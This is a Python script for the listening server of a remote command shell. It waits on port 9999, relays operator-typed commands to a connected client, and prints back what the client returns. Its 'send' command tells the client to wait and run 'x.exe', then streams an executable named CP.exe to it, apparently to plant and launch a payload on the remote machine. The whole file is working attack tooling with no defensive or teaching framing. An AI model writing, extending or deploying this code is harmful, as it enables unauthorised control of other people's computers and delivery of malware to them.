import socket
import sys
import rx7 as rx
rx.cls()
# Create Socket (Socket: Allows 2 computers to connect with each other)
def socket_create():
    try:
        global s
        global host
        global port
        host= ''
        port= 9999
        s= socket.socket()
    except socket.error as err:
        print('An error uccored in creating socket: ' + str(err))

# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        '''global s
        global host
        global port'''
        print(f'Binding socket to port {port}')
        s.bind((host,port))
        s.listen(5)
    except socket.error as err:
        print('An error uccored in binding socket: ' + str(err))
        print('Retrying...')
        socket_bind()


# Establish a connection with client  (socket must be listening for them)
def socket_accept():
    conn, address= s.accept()
    print(f'Connection has been established  |  IP: {address[0]} | PORT: {address[1]}')
    send_command(conn)
    conn.close()


# Send Commands
def send_command(conn):
    while True:
        cmd= input()
        if cmd =='send':
            import os
            conn.send(b'TIMEOUT /T 10 /NOBREAK && x.exe')
            print('sending...')
            import os,tqdm
            BUFFER_SIZE= 4096
            SEPARATOR = "<SEPARATOR>"
            filename= 'CP.exe'
            filesize = os.path.getsize(filename)
            #conn.send(f"{filename}{SEPARATOR}{filesize}".encode())
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024,)
            with open(filename, "rb") as f:
                for _ in progress:
                    bytes_read = f.read(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    conn.send(bytes_read)
                    progress.update(len(bytes_read))
            print('Done')
            conn.close()
            s.close()
            sys.exit()


        elif cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response= str(conn.recv(1024), 'utf-8')
            print(client_response, end='')


def MAIN():
    socket_create()
    socket_bind()
    socket_accept()
#if __name__ == "__main__":
MAIN()
